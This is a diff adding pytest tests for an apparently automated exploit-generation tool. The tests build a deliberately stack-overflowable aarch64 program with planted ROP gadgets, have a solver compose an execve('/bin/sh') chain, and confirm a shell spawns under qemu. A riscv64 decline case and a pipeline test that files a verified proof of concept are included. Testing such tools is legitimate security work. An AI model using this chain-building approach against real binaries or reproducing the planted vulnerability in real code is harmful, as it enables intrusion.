@@ -220,3 +220,120 @@ def test_auto_fallback_ordering_riscv64(store, tmp_path, monkeypatch):
 
 def test_auto_fallback_ordering_aarch64(store, tmp_path, monkeypatch):
     _run_auto_ordering("aarch64", _AA_GCC, _AA_QEMU, store, tmp_path, monkeypatch)
+
+
+# ---- MULTI-REGISTER execve-syscall (solve_lr_execve_chain) ---------------------------------------
+# aarch64 execve needs a0=&"/bin/sh", a1=0, a2=0 and libc's `mov x8,#221; svc` gateway. x1/x2 are
+# CALLER-saved, so a clean ret-terminated loader that sets them from the stack does not occur in stock
+# glibc (and the sound engine rejects the `ldp x1,x2` sequences that carry an svc/str in their body) --
+# which is why the solver honestly declines there. This fixture SUPPLIES clean arg-zeroing + value-
+# loader + caller gadgets by inline asm (as tests/test_rop_solver.py supplies x86 pop-gadgets), so the
+# solver's multi-register composition can be proven end to end where the gadgets exist.
+_ASM_EXECVE_AA = (
+    '#include <unistd.h>\n'
+    'char binsh[] = "/bin/sh";\n'
+    '__asm__(".text\\n"\n'
+    ' ".global g_argz\\n g_argz: ldp x1,x2,[sp,#16]\\n ldp x29,x30,[sp],#32\\n ret\\n"\n'   # L0
+    ' ".global g_load\\n g_load: ldp x19,x20,[sp,#16]\\n ldp x29,x30,[sp],#32\\n ret\\n"\n'  # LB
+    ' ".global g_call\\n g_call: mov x0,x19\\n br x20\\n"\n'                                  # caller
+    ' ".global g_exec\\n g_exec: mov x8,#221\\n svc #0\\n");\n'                               # gateway
+    'void vuln(void){ char b[64]; read(0,b,512); }\n'
+    'int main(void){ vuln(); return 0; }\n')
+
+
+def test_lr_execve_solver_shell_aarch64(tmp_path):
+    """solve_lr_execve_chain composes execve("/bin/sh",0,0) on aarch64 -- LB (stage sS=&binsh,
+    sB=gateway) -> L0 (zero a1=a2=0 LAST) -> caller (mov a0,sS; jr sB) -- and spawns a REAL shell under
+    qemu, with a negative control (wrong &binsh). No `system` symbol. Multi-register, so the engine's
+    survival guarantees matter: the caller is certified to preserve a1/a2 and L0 to preserve the
+    callee-saved sS/sB, and every effect is verified across seedings with no control-flow in a body."""
+    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
+        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
+    src = tmp_path / "v.c"
+    src.write_text(_ASM_EXECVE_AA)
+    exe = tmp_path / "v"
+    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
+                       str(src), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build aarch64 execve fixture")
+    data = exe.read_bytes()
+    binsh = rop.find_string(data, b"/bin/sh")
+    gateway = rop.find_aarch64_execve_site(data)
+    assert binsh and gateway
+    cap = make_qemu_capture(exe, "aarch64", "stdin", [], 12, endianness="little", bits=64)
+    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300, endian="little", word=8)
+    offset = rec[0] if rec else 72
+    cands = rop_solver.solve_lr_execve_chain(data, "aarch64", binsh=binsh, gateway=gateway,
+                                             offset=offset)
+    assert cands, "solver composed no aarch64 execve chain"
+    hit = None
+    for c in cands:
+        m = attribution.make_code_markers()
+        if m.proves(es._qemu_shell_detonate(exe, "aarch64", "little", 64, c["payload"], m, 12.0)):
+            hit = c
+            break
+    assert hit, "no solver-composed aarch64 execve chain spawned a shell"
+    neg = rop_solver.solve_lr_execve_chain(data, "aarch64", binsh=binsh ^ 0xFFFF, gateway=gateway,
+                                           offset=offset)
+    nc = next((c for c in neg if (c["l0"], c["lb"], c["caller"], c["base"])
+               == (hit["l0"], hit["lb"], hit["caller"], hit["base"])), None)
+    assert nc is not None
+    m2 = attribution.make_code_markers()
+    assert not m2.proves(es._qemu_shell_detonate(exe, "aarch64", "little", 64, nc["payload"], m2, 12.0))
+
+
+def test_lr_execve_solver_riscv64_declines(tmp_path):
+    """HONEST CEILING: on riscv64 the execve-syscall chain needs a2(envp)=0 in a ra-restoring gadget,
+    and the sound engine finds none (a2 is reachable only as a2<-a0), so solve_lr_execve_chain returns
+    [] -- the a2/envp wall, PROVEN by emulation rather than asserted. The gateway address is immaterial
+    here: the decline is at the arg-zeroing-loader step, before any gateway is used."""
+    if not (_RV_GCC and gadget_emu.available()):
+        pytest.skip("needs riscv64 toolchain + unicorn/capstone")
+    src = tmp_path / "v.c"
+    src.write_text(_SRC)
+    exe = tmp_path / "v"
+    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
+                       str(src), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build riscv64 fixture")
+    data = exe.read_bytes()
+    binsh = rop.find_string(data, b"/bin/sh")
+    cands = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh, gateway=binsh, offset=72)
+    assert cands == [], "riscv64 execve unexpectedly composed -- the a2/envp wall should block it"
+
+
+def test_lr_execve_solver_stage_files_l3_aarch64(store, tmp_path, monkeypatch):
+    """The build_exploit STAGE files the solver-composed execve L3 on aarch64. strategy="execve" runs
+    the execve paths; monkeypatching the byte-pattern loader finder to empty makes the PATTERN execve
+    path decline, so the ONLY clause that can file is the semantic execve solver -- proving the wiring
+    end to end (compose -> reach the svc with x0=&"/bin/sh" AND x1=x2=0 + a negative control -> L3)."""
+    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
+        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
+    from lykos.analyze import register
+    from lykos.analyze.ingest import enqueue_triage, ingest
+    from lykos.analyze.poc import enqueue_exploit
+    from lykos.db.dao import FindingDAO, PocDAO
+    from lykos.jobs import JobConfig, JobQueue, WorkerPool
+    src = tmp_path / "v.c"
+    src.write_text(_ASM_EXECVE_AA)
+    exe = tmp_path / "v"
+    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
+                       str(src), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build aarch64 execve fixture")
+    # neuter the byte-pattern loader finder so the PATTERN execve path declines -> isolates the solver
+    monkeypatch.setattr(rop, "find_aarch64_r2libc_gadgets",
+                        lambda data: {"callers": [], "loaders": []})
+    register()
+    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
+    pool.start()
+    try:
+        t = ingest(store, store.cases.create("lrexec").id, exe, filename="v")
+        q = JobQueue(store.conn)
+        enqueue_triage(q, t, force=True)
+        assert pool.wait_idle(180)
+        run = enqueue_exploit(q, t, params={"strategy": "execve", "timeout": 14})
+        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
+    finally:
+        pool.stop(grace=3.0)
+    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
+    assert l3, "the stage filed no solver-composed aarch64 execve L3"
+    fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:aarch64-execve-syscall-solver:{t.id}")
+    assert fid, "L3 filed but not via the execve semantic solver"
